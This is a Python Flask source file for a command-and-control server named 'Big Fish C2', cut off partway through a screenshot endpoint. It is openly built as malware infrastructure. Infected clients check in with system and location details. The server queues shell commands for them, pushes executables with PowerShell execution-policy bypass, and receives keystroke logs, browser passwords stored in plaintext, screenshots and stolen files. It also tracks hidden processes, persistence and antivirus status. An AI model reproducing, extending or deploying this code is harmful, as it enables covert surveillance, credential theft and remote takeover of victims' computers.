#!/usr/bin/env python3
"""
Advanced C2 Server - Big Fish System
Features: Client monitoring, file upload/download, keylogging, password extraction
"""
from flask import Flask, request, jsonify, send_file, Response
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import time
import uuid
import sqlite3
import threading
import os
import hashlib
from datetime import datetime
import base64
import json
import logging
from cryptography.fernet import Fernet
import zipfile
import io

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app, origins="*")
socketio = SocketIO(app, cors_allowed_origins="*")

# Configuration
DATABASE = 'bigfish.db'
ONLINE_THRESHOLD = 300  # 5 minutes
DOWNLOAD_FOLDER = 'downloads'
UPLOAD_FOLDER = 'uploads'
EXECUTABLES_FOLDER = 'executables'
SCREENSHOTS_FOLDER = 'screenshots'
KEYLOGS_FOLDER = 'keylogs'
PASSWORDS_FOLDER = 'passwords'

# Create folders
for folder in [DOWNLOAD_FOLDER, UPLOAD_FOLDER, EXECUTABLES_FOLDER, 
               SCREENSHOTS_FOLDER, KEYLOGS_FOLDER, PASSWORDS_FOLDER]:
    os.makedirs(folder, exist_ok=True)

# Encryption
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

def init_db():
    """Initialize database with all tables"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    # Clients table
    c.execute("""CREATE TABLE IF NOT EXISTS clients (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        username TEXT,
        os TEXT,
        os_version TEXT,
        arch TEXT,
        cpu TEXT,
        ram TEXT,
        gpu TEXT,
        ip TEXT,
        last_seen REAL,
        status TEXT,
        privileges TEXT,
        av_status TEXT,
        country TEXT,
        city TEXT,
        isp TEXT,
        process_hidden INTEGER DEFAULT 0,
        keylogger_active INTEGER DEFAULT 0,
        persistence_set INTEGER DEFAULT 0,
        created_at REAL,
        download_folder TEXT,
        online_hours REAL DEFAULT 0
    )""")
    
    # Commands table
    c.execute("""CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        command TEXT,
        command_type TEXT,
        status TEXT,
        output TEXT,
        created_at REAL,
        executed_at REAL,
        priority INTEGER DEFAULT 5,
        require_admin INTEGER DEFAULT 0,
        encrypted INTEGER DEFAULT 0,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Files table
    c.execute("""CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        filename TEXT,
        original_name TEXT,
        filepath TEXT,
        filetype TEXT,
        filesize INTEGER,
        uploaded_at REAL,
        downloaded INTEGER DEFAULT 0,
        hash_md5 TEXT,
        hash_sha256 TEXT,
        encrypted INTEGER DEFAULT 0,
        tags TEXT,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Executables table
    c.execute("""CREATE TABLE IF NOT EXISTS executables (
        id TEXT PRIMARY KEY,
        name TEXT,
        description TEXT,
        filename TEXT,
        filepath TEXT,
        platform TEXT,
        require_admin INTEGER DEFAULT 0,
        uploader TEXT,
        uploaded_at REAL,
        downloads INTEGER DEFAULT 0,
        hash_sha256 TEXT,
        size INTEGER
    )""")
    
    # Keylogs table
    c.execute("""CREATE TABLE IF NOT EXISTS keylogs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT,
        keystrokes TEXT,
        window_title TEXT,
        timestamp REAL,
        process_name TEXT,
        encrypted INTEGER DEFAULT 1,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Screenshots table
    c.execute("""CREATE TABLE IF NOT EXISTS screenshots (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        timestamp REAL,
        filepath TEXT,
        thumbnail_path TEXT,
        width INTEGER,
        height INTEGER,
        size INTEGER,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Passwords table
    c.execute("""CREATE TABLE IF NOT EXISTS passwords (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        browser TEXT,
        url TEXT,
        username TEXT,
        password TEXT,
        encrypted_password TEXT,
        timestamp REAL,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # System info table
    c.execute("""CREATE TABLE IF NOT EXISTS system_info (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT,
        info_type TEXT,
        info_key TEXT,
        info_value TEXT,
        timestamp REAL,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Tasks table
    c.execute("""CREATE TABLE IF NOT EXISTS tasks (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        task_type TEXT,
        task_data TEXT,
        status TEXT,
        result TEXT,
        created_at REAL,
        completed_at REAL,
        scheduled_for REAL,
        priority INTEGER DEFAULT 5
    )""")
    
    # Create indexes
    c.execute("CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_files_client ON files(client_id)")
    
    conn.commit()
    conn.close()
    logger.info("[✓] Database initialized")

init_db()

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def encrypt_data(data):
    """Encrypt sensitive data"""
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(cipher.encrypt(data)).decode()

def decrypt_data(encrypted_data):
    """Decrypt data"""
    return cipher.decrypt(base64.b64decode(encrypted_data)).decode()

def get_client_folder(client_id, hostname):
    """Get or create client-specific folder"""
    safe_name = "".join(c for c in hostname if c.isalnum() or c in (' ', '-', '_')).strip()
    if not safe_name:
        safe_name = f"client_{client_id[:8]}"
    
    folders = {
        'downloads': os.path.join(DOWNLOAD_FOLDER, safe_name),
        'screenshots': os.path.join(SCREENSHOTS_FOLDER, safe_name),
        'keylogs': os.path.join(KEYLOGS_FOLDER, safe_name),
        'passwords': os.path.join(PASSWORDS_FOLDER, safe_name)
    }
    
    for folder in folders.values():
        os.makedirs(folder, exist_ok=True)
    
    return folders

# ==================== ROUTES ====================

@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'system': 'Big Fish C2',
        'version': '4.0',
        'clients': get_online_count()
    })

@app.route('/api/health')
def health():
    return jsonify({'status': 'healthy'})

@app.route('/api/checkin', methods=['POST'])
def client_checkin():
    """Client checkin endpoint"""
    try:
        data = request.json
        client_id = data.get('id')
        
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        
        conn = get_db()
        c = conn.cursor()
        current_time = time.time()
        
        # Get client IP
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Prepare client data
        hostname = data.get('hostname', 'Unknown')
        client_folders = get_client_folder(client_id, hostname)
        
        # Check if client exists
        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        existing_client = c.fetchone()
        
        if existing_client:
            # Update existing client
            online_hours = existing_client['online_hours']
            if existing_client['status'] == 'offline':
                online_hours += (current_time - existing_client['last_seen']) / 3600
            
            c.execute("""UPDATE clients SET 
                hostname=?, username=?, os=?, os_version=?, arch=?,
                cpu=?, ram=?, gpu=?, ip=?, last_seen=?,
                status='online', privileges=?, av_status=?,
                country=?, city=?, isp=?, download_folder=?, online_hours=?
                WHERE id=?""",
                (data.get('hostname'), data.get('username'),
                 data.get('os'), data.get('os_version'),
                 data.get('arch'), data.get('cpu'),
                 data.get('ram'), data.get('gpu'),
                 client_ip, current_time,
                 data.get('privileges'), data.get('av_status'),
                 data.get('country'), data.get('city'),
                 data.get('isp'), client_folders['downloads'],
                 online_hours, client_id))
        else:
            # Insert new client
            c.execute("""INSERT INTO clients VALUES 
                (?,?,?,?,?,?,?,?,?,?,?,'online',?,?,?,?,?,?,?,?,?,?,?)""",
                (client_id, data.get('hostname'), data.get('username'),
                 data.get('os'), data.get('os_version'), data.get('arch'),
                 data.get('cpu'), data.get('ram'), data.get('gpu'),
                 client_ip, current_time, data.get('privileges'),
                 data.get('av_status'), data.get('country'),
                 data.get('city'), data.get('isp'), 0, 0, 0,
                 current_time, client_folders['downloads'], 0))
        
        # Store system info
        if 'system_info' in data:
            for key, value in data['system_info'].items():
                c.execute("""INSERT INTO system_info (client_id, info_type, info_key, info_value, timestamp)
                          VALUES (?, 'system', ?, ?, ?)""",
                          (client_id, key, str(value), current_time))
        
        conn.commit()
        conn.close()
        
        # Notify via WebSocket
        socketio.emit('client_update', {
            'client_id': client_id,
            'hostname': hostname,
            'status': 'online',
            'timestamp': current_time
        })
        
        logger.info(f"[✓] Checkin: {hostname} ({client_ip})")
        
        return jsonify({
            'status': 'ok',
            'timestamp': current_time,
            'server_time': datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"[✗] Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/clients', methods=['GET'])
def get_all_clients():
    """Get all clients with detailed info"""
    try:
        conn = get_db()
        c = conn.cursor()
        current_time = time.time()
        
        # Update offline status
        c.execute("UPDATE clients SET status='offline' WHERE ?-last_seen>?", 
                 (current_time, ONLINE_THRESHOLD))
        conn.commit()
        
        # Get all clients with stats
        c.execute("""SELECT 
            c.*,
            COUNT(DISTINCT f.id) as total_files,
            COUNT(DISTINCT s.id) as total_screenshots,
            COUNT(DISTINCT k.id) as total_keylogs,
            COUNT(DISTINCT p.id) as total_passwords,
            COALESCE(MAX(s.timestamp), 0) as last_screenshot,
            COALESCE(MAX(k.timestamp), 0) as last_keylog
            FROM clients c
            LEFT JOIN files f ON c.id = f.client_id
            LEFT JOIN screenshots s ON c.id = s.client_id
            LEFT JOIN keylogs k ON c.id = k.client_id
            LEFT JOIN passwords p ON c.id = p.client_id
            GROUP BY c.id
            ORDER BY c.last_seen DESC""")
        
        clients = []
        for row in c.fetchall():
            time_diff = current_time - row['last_seen']
            
            # Determine status
            if time_diff < 60:
                status = 'online'
                status_icon = '🟢'
            elif time_diff < 300:
                status = 'idle'
                status_icon = '🟡'
            else:
                status = 'offline'
                status_icon = '🔴'
            
            # Calculate uptime
            uptime_str = ""
            if row['online_hours'] > 0:
                if row['online_hours'] < 1:
                    uptime_str = f"{row['online_hours']*60:.0f}m"
                elif row['online_hours'] < 24:
                    uptime_str = f"{row['online_hours']:.1f}h"
                else:
                    uptime_str = f"{row['online_hours']/24:.1f}d"
            
            client_data = {
                'id': row['id'],
                'hostname': row['hostname'],
                'username': row['username'],
                'os': f"{row['os']} {row['os_version'] or ''}",
                'arch': row['arch'],
                'cpu': row['cpu'],
                'ram': row['ram'],
                'gpu': row['gpu'],
                'ip': row['ip'],
                'country': row['country'],
                'city': row['city'],
                'isp': row['isp'],
                'privileges': row['privileges'],
                'av_status': row['av_status'],
                'status': status,
                'status_icon': status_icon,
                'process_hidden': bool(row['process_hidden']),
                'keylogger_active': bool(row['keylogger_active']),
                'persistence_set': bool(row['persistence_set']),
                'last_seen': row['last_seen'],
                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%Y-%m-%d %H:%M:%S'),
                'created_at': row['created_at'],
                'created_str': datetime.fromtimestamp(row['created_at']).strftime('%Y-%m-%d'),
                'online_hours': row['online_hours'],
                'uptime_str': uptime_str,
                'stats': {
                    'files': row['total_files'],
                    'screenshots': row['total_screenshots'],
                    'keylogs': row['total_keylogs'],
                    'passwords': row['total_passwords']
                },
                'last_activity': {
                    'screenshot': row['last_screenshot'],
                    'keylog': row['last_keylog']
                }
            }
            clients.append(client_data)
        
        conn.close()
        return jsonify({'clients': clients})
        
    except Exception as e:
        logger.error(f"[✗] Get clients error: {e}")
        return jsonify({'clients': []})

@app.route('/api/client/<client_id>', methods=['GET'])
def get_client_details(client_id):
    """Get detailed information about a specific client"""
    try:
        conn = get_db()
        c = conn.cursor()
        
        # Get client info
        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        client = c.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Get recent commands
        c.execute("""SELECT * FROM commands 
                    WHERE client_id = ? 
                    ORDER BY created_at DESC LIMIT 20""", (client_id,))
        commands = [dict(row) for row in c.fetchall()]
        
        # Get system info
        c.execute("""SELECT info_key, info_value FROM system_info 
                    WHERE client_id = ? AND info_type = 'system'
                    ORDER BY timestamp DESC""", (client_id,))
        system_info = {row['info_key']: row['info_value'] for row in c.fetchall()}
        
        # Get file statistics
        c.execute("""SELECT filetype, COUNT(*) as count, 
                    SUM(filesize) as total_size 
                    FROM files WHERE client_id = ? 
                    GROUP BY filetype""", (client_id,))
        file_stats = [dict(row) for row in c.fetchall()]
        
        conn.close()
        
        return jsonify({
            'client': dict(client),
            'commands': commands,
            'system_info': system_info,
            'file_stats': file_stats
        })
        
    except Exception as e:
        logger.error(f"[✗] Client details error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        command_type = data.get('type', 'shell')
        require_admin = data.get('require_admin', False)
        priority = data.get('priority', 5)
        
        if not client_id or not command:
            return jsonify({'error': 'Missing parameters'}), 400
        
        conn = get_db()
        c = conn.cursor()
        
        # Check if client exists
        c.execute('SELECT id FROM clients WHERE id = ?', (client_id,))
        if not c.fetchone():
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Create command
        cmd_id = str(uuid.uuid4())
        c.execute("""INSERT INTO commands 
                    (id, client_id, command, command_type, status, 
                     created_at, priority, require_admin)
                    VALUES (?, ?, ?, ?, 'pending', ?, ?, ?)""",
                 (cmd_id, client_id, command, command_type, 
                  time.time(), priority, 1 if require_admin else 0))
        
        conn.commit()
        conn.close()
        
        logger.info(f"[✓] Command sent: {command_type} to {client_id[:8]}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Command queued'
        })
        
    except Exception as e:
        logger.error(f"[✗] Send command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_pending_commands(client_id):
    """Get pending commands for client"""
    try:
        conn = get_db()
        c = conn.cursor()
        current_time = time.time()
        
        # Update last seen
        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?", 
                 (current_time, client_id))
        
        # Get pending commands
        c.execute("""SELECT id, command, command_type, require_admin 
                    FROM commands 
                    WHERE client_id = ? AND status = 'pending'
                    ORDER BY priority DESC, created_at ASC
                    LIMIT 10""", (client_id,))
        
        commands = [{'id': row['id'], 'command': row['command'],
                    'type': row['command_type'], 
                    'require_admin': bool(row['require_admin'])} 
                   for row in c.fetchall()]
        
        if commands:
            # Mark as sent
            cmd_ids = [cmd['id'] for cmd in commands]
            placeholders = ','.join(['?'] * len(cmd_ids))
            c.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", cmd_ids)
        
        conn.commit()
        conn.close()
        
        return jsonify({'commands': commands})
        
    except Exception as e:
        logger.error(f"[✗] Get commands error: {e}")
        return jsonify({'commands': []})

@app.route('/api/command/result', methods=['POST'])
def submit_command_result():
    """Submit command execution result"""
    try:
        data = request.json
        command_id = data.get('command_id')
        output = data.get('output', '')
        status = data.get('status', 'completed')
        
        if not command_id:
            return jsonify({'error': 'Missing command ID'}), 400
        
        conn = get_db()
        c = conn.cursor()
        
        c.execute("""UPDATE commands 
                    SET status = ?, output = ?, executed_at = ?
                    WHERE id = ?""",
                 (status, output, time.time(), command_id))
        
        # Get client ID from command
        c.execute("SELECT client_id FROM commands WHERE id = ?", (command_id,))
        result = c.fetchone()
        
        conn.commit()
        conn.close()
        
        if result:
            # Notify via WebSocket
            socketio.emit('command_result', {
                'command_id': command_id,
                'client_id': result['client_id'],
                'status': status,
                'timestamp': time.time()
            })
        
        logger.info(f"[✓] Command result: {command_id[:8]} - {status}")
        
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"[✗] Submit result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Upload file from client"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        file_type = request.form.get('type', 'unknown')
        
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        
        if file.filename == '':
            return jsonify({'error': 'No filename'}), 400
        
        conn = get_db()
        c = conn.cursor()
        
        # Get client info
        c.execute('SELECT hostname, download_folder FROM clients WHERE id = ?', (client_id,))
        client = c.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Determine file type and folder
        filename = file.filename.lower()
        if any(filename.endswith(ext) for ext in ['.exe', '.msi', '.bat', '.ps1', '.vbs']):
            file_type = 'executable'
            folder = EXECUTABLES_FOLDER
        elif any(filename.endswith(ext) for ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
            file_type = 'image'
            folder = SCREENSHOTS_FOLDER
        elif any(filename.endswith(ext) for ext in ['.txt', '.log', '.cfg', '.ini']):
            file_type = 'document'
            folder = os.path.join(DOWNLOAD_FOLDER, client['hostname'], 'documents')
        else:
            file_type = 'other'
            folder = os.path.join(DOWNLOAD_FOLDER, client['hostname'], 'other')
        
        os.makedirs(folder, exist_ok=True)
        
        # Save file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_filename = f"{timestamp}_{file.filename}"
        filepath = os.path.join(folder, safe_filename)
        
        file.save(filepath)
        filesize = os.path.getsize(filepath)
        
        # Calculate hashes
        with open(filepath, 'rb') as f:
            file_data = f.read()
            hash_md5 = hashlib.md5(file_data).hexdigest()
            hash_sha256 = hashlib.sha256(file_data).hexdigest()
        
        # Store in database
        file_id = str(uuid.uuid4())
        c.execute("""INSERT INTO files 
                    (id, client_id, filename, original_name, filepath, 
                     filetype, filesize, uploaded_at, hash_md5, hash_sha256)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                 (file_id, client_id, safe_filename, file.filename,
                  filepath, file_type, filesize, time.time(),
                  hash_md5, hash_sha256))
        
        conn.commit()
        conn.close()
        
        logger.info(f"[✓] File uploaded: {file.filename} ({filesize} bytes) from {client['hostname']}")
        
        return jsonify({
            'success': True,
            'file_id': file_id,
            'filename': file.filename,
            'size': filesize,
            'hash_sha256': hash_sha256
        })
        
    except Exception as e:
        logger.error(f"[✗] Upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/<client_id>', methods=['GET'])
def list_client_files(client_id):
    """List files from a client"""
    try:
        conn = get_db()
        c = conn.cursor()
        
        c.execute("""SELECT id, original_name, filetype, filesize, 
                    uploaded_at, downloaded, hash_sha256
                    FROM files 
                    WHERE client_id = ?
                    ORDER BY uploaded_at DESC""", (client_id,))
        
        files = []
        for row in c.fetchall():
            files.append({
                'id': row['id'],
                'filename': row['original_name'],
                'type': row['filetype'],
                'size': row['filesize'],
                'size_str': format_size(row['filesize']),
                'uploaded': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d %H:%M'),
                'downloaded': bool(row['downloaded']),
                'hash': row['hash_sha256'][:16] + '...'
            })
        
        conn.close()
        return jsonify({'files': files})
        
    except Exception as e:
        logger.error(f"[✗] List files error: {e}")
        return jsonify({'files': []})

@app.route('/api/file/download/<file_id>', methods=['GET'])
def download_file(file_id):
    """Download a file"""
    try:
        conn = get_db()
        c = conn.cursor()
        
        c.execute("SELECT filepath, original_name FROM files WHERE id = ?", (file_id,))
        file_info = c.fetchone()
        
        if not file_info or not os.path.exists(file_info['filepath']):
            conn.close()
            return jsonify({'error': 'File not found'}), 404
        
        # Mark as downloaded
        c.execute("UPDATE files SET downloaded = 1 WHERE id = ?", (file_id,))
        conn.commit()
        conn.close()
        
        return send_file(
            file_info['filepath'],
            as_attachment=True,
            download_name=file_info['original_name']
        )
        
    except Exception as e:
        logger.error(f"[✗] Download error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/executables', methods=['GET', 'POST'])
def manage_executables():
    """Manage executables library"""
    if request.method == 'GET':
        # List executables
        try:
            conn = get_db()
            c = conn.cursor()
            
            c.execute("""SELECT id, name, description, filename, platform, 
                        require_admin, uploader, uploaded_at, downloads, size
                        FROM executables 
                        ORDER BY uploaded_at DESC""")
            
            executables = []
            for row in c.fetchall():
                executables.append({
                    'id': row['id'],
                    'name': row['name'],
                    'description': row['description'],
                    'filename': row['filename'],
                    'platform': row['platform'],
                    'require_admin': bool(row['require_admin']),
                    'uploader': row['uploader'],
                    'uploaded': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d'),
                    'downloads': row['downloads'],
                    'size': format_size(row['size'])
                })
            
            conn.close()
            return jsonify({'executables': executables})
            
        except Exception as e:
            logger.error(f"[✗] List executables error: {e}")
            return jsonify({'executables': []})
    
    elif request.method == 'POST':
        # Upload new executable
        try:
            if 'file' not in request.files:
                return jsonify({'error': 'No file provided'}), 400
            
            file = request.files['file']
            name = request.form.get('name', file.filename)
            description = request.form.get('description', '')
            platform = request.form.get('platform', 'windows')
            require_admin = request.form.get('require_admin', 'false') == 'true'
            uploader = request.form.get('uploader', 'admin')
            
            if file.filename == '':
                return jsonify({'error': 'No filename'}), 400
            
            # Save file
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            safe_filename = f"{timestamp}_{file.filename}"
            filepath = os.path.join(EXECUTABLES_FOLDER, safe_filename)
            
            file.save(filepath)
            filesize = os.path.getsize(filepath)
            
            # Calculate hash
            with open(filepath, 'rb') as f:
                file_data = f.read()
                hash_sha256 = hashlib.sha256(file_data).hexdigest()
            
            # Store in database
            conn = get_db()
            c = conn.cursor()
            
            exe_id = str(uuid.uuid4())
            c.execute("""INSERT INTO executables 
                        (id, name, description, filename, filepath, platform,
                         require_admin, uploader, uploaded_at, hash_sha256, size)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                     (exe_id, name, description, safe_filename, filepath,
                      platform, 1 if require_admin else 0, uploader,
                      time.time(), hash_sha256, filesize))
            
            conn.commit()
            conn.close()
            
            logger.info(f"[✓] Executable uploaded: {name} ({filesize} bytes)")
            
            return jsonify({
                'success': True,
                'executable_id': exe_id,
                'name': name,
                'hash': hash_sha256
            })
            
        except Exception as e:
            logger.error(f"[✗] Upload executable error: {e}")
            return jsonify({'error': str(e)}), 500

@app.route('/api/executable/deploy', methods=['POST'])
def deploy_executable():
    """Deploy executable to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        executable_id = data.get('executable_id')
        arguments = data.get('arguments', '')
        run_as_admin = data.get('run_as_admin', False)
        
        if not client_id or not executable_id:
            return jsonify({'error': 'Missing parameters'}), 400
        
        conn = get_db()
        c = conn.cursor()
        
        # Get executable info
        c.execute("SELECT * FROM executables WHERE id = ?", (executable_id,))
        executable = c.fetchone()
        
        if not executable:
            conn.close()
            return jsonify({'error': 'Executable not found'}), 404
        
        # Get client info
        c.execute("SELECT hostname FROM clients WHERE id = ?", (client_id,))
        client = c.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Create deployment command
        if executable['platform'] == 'windows':
            if executable['filename'].endswith('.ps1'):
                command = f"powershell -ExecutionPolicy Bypass -File {executable['filename']} {arguments}"
            elif executable['filename'].endswith('.bat'):
                command = f"cmd /c {executable['filename']} {arguments}"
            else:
                command = f"{executable['filename']} {arguments}"
        else:
            command = f"./{executable['filename']} {arguments}"
        
        # Add admin requirement if needed
        require_admin = executable['require_admin'] or run_as_admin
        
        # Create command record
        cmd_id = str(uuid.uuid4())
        c.execute("""INSERT INTO commands 
                    (id, client_id, command, command_type, status, 
                     created_at, require_admin, priority)
                    VALUES (?, ?, ?, 'deploy', 'pending', ?, ?, 1)""",
                 (cmd_id, client_id, command, time.time(), 
                  1 if require_admin else 0))
        
        # Increment download count
        c.execute("UPDATE executables SET downloads = downloads + 1 WHERE id = ?", 
                 (executable_id,))
        
        conn.commit()
        conn.close()
        
        logger.info(f"[✓] Executable deployment queued: {executable['name']} to {client['hostname']}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Deployment queued'
        })
        
    except Exception as e:
        logger.error(f"[✗] Deploy executable error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/keylog', methods=['POST'])
def upload_keylog():
    """Upload keylog data"""
    try:
        data = request.json
        client_id = data.get('client_id')
        keystrokes = data.get('keystrokes')
        window_title = data.get('window_title', 'Unknown')
        process_name = data.get('process_name', 'Unknown')
        
        if not client_id or not keystrokes:
            return jsonify({'error': 'Missing data'}), 400
        
        # Decrypt if needed
        if data.get('encrypted', False):
            try:
                keystrokes = decrypt_data(keystrokes)
            except:
                pass
        
        conn = get_db()
        c = conn.cursor()
        
        # Store in database
        c.execute("""INSERT INTO keylogs 
                    (client_id, keystrokes, window_title, timestamp, process_name)
                    VALUES (?, ?, ?, ?, ?)""",
                 (client_id, keystrokes, window_title, time.time(), process_name))
        
        # Update client last keylog time
        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?", 
                 (time.time(), client_id))
        
        conn.commit()
        conn.close()
        
        logger.info(f"[✓] Keylog received from {client_id[:8]}")
        
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"[✗] Keylog upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/keylogs/<client_id>', methods=['GET'])
def get_keylogs(client_id):
    """Get keylogs for a client"""
    try:
        limit = request.args.get('limit', 50, type=int)
        
        conn = get_db()
        c = conn.cursor()
        
        c.execute("""SELECT keystrokes, window_title, timestamp, process_name
                    FROM keylogs 
                    WHERE client_id = ?
                    ORDER BY timestamp DESC
                    LIMIT ?""", (client_id, limit))
        
        keylogs = []
        for row in c.fetchall():
            keylogs.append({
                'keystrokes': row['keystrokes'],
                'window': row['window_title'],
                'process': row['process_name'],
                'timestamp': row['timestamp'],
                'time': datetime.fromtimestamp(row['timestamp']).strftime('%H:%M:%S')
            })
        
        conn.close()
        return jsonify({'keylogs': keylogs})
        
    except Exception as e:
        logger.error(f"[✗] Get keylogs error: {e}")
        return jsonify({'keylogs': []})

@app.route('/api/passwords', methods=['POST'])
def upload_passwords():
    """Upload extracted passwords"""
    try:
        data = request.json
        client_id = data.get('client_id')
        passwords = data.get('passwords', [])
        
        if not client_id or not passwords:
            return jsonify({'error': 'Missing data'}), 400
        
        conn = get_db()
        c = conn.cursor()
        
        for pwd in passwords:
            browser = pwd.get('browser', 'Unknown')
            url = pwd.get('url', '')
            username = pwd.get('username', '')
            password = pwd.get('password', '')
            
            # Encrypt password
            encrypted_password = encrypt_data(password) if password else ''
            
            pwd_id = str(uuid.uuid4())
            c.execute("""INSERT INTO passwords 
                        (id, client_id, browser, url, username, password, 
                         encrypted_password, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                     (pwd_id, client_id, browser, url, username, 
                      password, encrypted_password, time.time()))
        
        conn.commit()
        conn.close()
        
        logger.info(f"[✓] Passwords uploaded from {client_id[:8]}: {len(passwords)}")
        
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"[✗] Passwords upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/passwords/<client_id>', methods=['GET'])
def get_passwords(client_id):
    """Get passwords for a client"""
    try:
        conn = get_db()
        c = conn.cursor()
        
        c.execute("""SELECT browser, url, username, password, timestamp
                    FROM passwords 
                    WHERE client_id = ?
                    ORDER BY timestamp DESC""", (client_id,))
        
        passwords = []
        for row in c.fetchall():
            passwords.append({
                'browser': row['browser'],
                'url': row['url'],
                'username': row['username'],
                'password': row['password'],  # Already decrypted
                'timestamp': row['timestamp'],
                'time': datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d %H:%M')
            })
        
        conn.close()
        return jsonify({'passwords': passwords})
        
    except Exception as e:
        logger.error(f"[✗] Get passwords error: {e}")
        return jsonify({'passwords': []})

@app.route('/api/screenshot', methods=['POST'])
def upload_screenshot():
    """Upload screenshot"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        
        conn = get_db()
        c = conn.cursor()
        
        # Get client folder
        c.execute('SELECT hostname FROM clients WHERE id = ?', (client_id,))
        client = c.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Save screenshot
        client_folder = os.path.join(SCREENSHOTS_FOLDER, client['hostname'])
        os.makedirs(client_folder, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join(client_folder, filename)
        
        file.save(filepath)
        filesize = os.path.getsize(filepath)
        
        # Get image dimensions (optional)
        width = height = 0
        try:
            from PIL import Image
            with Image.open(filepath) as img:
                width, height = img.size
        except:
            pass
        
        # Store in database
        screenshot_id = str(uuid.uuid4())
        c.execute("""INSERT INTO screenshots 
                    (id, client_id, timestamp, filepath, width, height, size)
                    VALUES (?, ?, ?, ?, ?, ?, ?)""",
                 (screenshot_id, client_id, time.time(), filepath, 
                  width, height, filesize))
        
        conn.commit()
        conn.close()
        
        logger.info(f"[✓] Screenshot uploaded from {client['hostname']}")
        
        return jsonify({
            'success': True,
            'screenshot_id': screenshot_id,
            'filename': filename
        })
        
    except Exception as e:
        logger.error(f"[✗] Screenshot upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshots/<client_id>', methods=['GET'])
def get_screenshots(client_id):
    """Get screenshots for a client"""
    try:
        conn = get_db()
        c = conn.cursor()
        
        c.execute("""SELECT id, timestamp, filepath, width, height, size
                    FROM screenshots 
                    WHERE client_id = ?
